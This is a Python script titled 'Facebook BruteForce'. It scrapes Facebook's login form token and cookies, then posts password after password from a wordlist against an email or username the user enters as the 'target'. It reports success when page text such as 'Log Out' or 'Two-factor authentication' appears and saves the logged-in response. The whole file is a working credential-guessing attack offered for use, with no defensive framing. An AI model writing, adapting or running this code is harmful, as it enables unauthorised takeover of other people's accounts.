import os
import requests
from bs4 import BeautifulSoup
import sys
import logging

logging.basicConfig(level=logging.INFO)

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = {}
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    try:
        data = requests.get(POST_URL, headers=HEADERS)
        for i in data.cookies:
            cookies[i.name] = i.value
        data = BeautifulSoup(data.text, 'html.parser').form
        if data.input['name'] == 'lsd':
            form['lsd'] = data.input['value']
        return form, cookies
    except Exception as e:
        logging.error(f"Error creating form: {e}")
        return None, None


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    try:
        if index % 10 == 0:
            PAYLOAD, COOKIES = create_form()
            PAYLOAD['email'] = email
        PAYLOAD['pass'] = password
        r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
        if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
            open('temp', 'w').write(str(r.content))
            print('\nPassword found: ', password)
            return True
        return False
    except Exception as e:
        logging.error(f"Error testing password: {e}")
        return False


if __name__ == "__main__":
    print('\n---------- Welcome To Facebook BruteForce ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file does not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input('Enter Email/Username to target: ').strip()
    for index, password in enumerate(password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break


